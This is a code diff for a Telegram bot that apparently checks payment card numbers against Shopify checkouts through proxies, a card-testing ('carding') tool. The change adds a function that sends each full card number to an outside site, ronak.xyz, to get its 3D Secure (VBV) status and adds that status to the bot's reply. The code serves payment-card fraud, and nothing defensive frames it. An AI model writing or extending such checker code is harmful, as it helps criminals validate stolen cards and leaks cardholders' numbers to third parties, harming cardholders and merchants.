@@ -3,6 +3,7 @@ import asyncio
 import logging
 import time
 import httpx
+import html
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
 from shopify_auto_checkout import ShopifyChecker, parse_proxy
@@ -119,6 +120,18 @@ async def get_bin_info(bin_number):
         pass
     return None
 
+async def get_vbv_info(cc_number):
+    """Get VBV (3D Secure) information from API"""
+    try:
+        async with httpx.AsyncClient(timeout=10.0) as client:
+            response = await client.get(f"https://ronak.xyz/vbv.php?cc={cc_number}")
+            if response.status_code == 200:
+                text = response.text
+                return text.strip() if text else 'N/A'
+    except:
+        pass
+    return 'N/A'
+
 async def show_progress_animation(msg, total_steps=5):
     """Show cool progress animation"""
     progress_stages = [
@@ -163,6 +176,7 @@ async def sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     try:
         bin_info = await get_bin_info(card_num[:6])
+        vbv_info = await get_vbv_info(card_num)
         
         checker = ShopifyChecker(proxy=proxy)
         result_data = await checker.check_card(
@@ -248,6 +262,7 @@ async def sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
 𝐂𝐂 ➜ <code>{card_display}</code>
 𝐒𝐓𝐀𝐓𝐔𝐒 ➜ {status}
 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {response_msg}
+𝑽𝑩𝑽 ➜ {html.escape(vbv_info)}
 𝐫𝐞𝐚𝐬𝐨𝐧/𝐭𝐲𝐩𝐞 ➜ {reason_type}
 ━━━━━━━━━
 𝐁𝐈𝐍 ➜ {bin_num}
